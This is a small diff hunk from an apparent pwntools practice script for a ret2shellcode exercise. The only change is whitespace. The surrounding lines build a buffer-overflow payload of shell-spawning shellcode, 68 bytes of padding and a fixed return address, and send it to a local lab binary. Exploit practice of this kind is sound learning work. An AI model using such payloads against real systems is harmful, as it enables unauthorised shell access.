@@ -18,7 +18,7 @@ def ret2_shellcode1(file_name='/mnt/hgfs/Cyber Security PWN/ROP/ret2shellcode'):
         io = process([file_name])
 
         io.recvline()
-
+        
         payload = asm(shellcraft.sh()) + b'A' * 68 + p32(0x0804A080)
 
         io.sendline(payload)
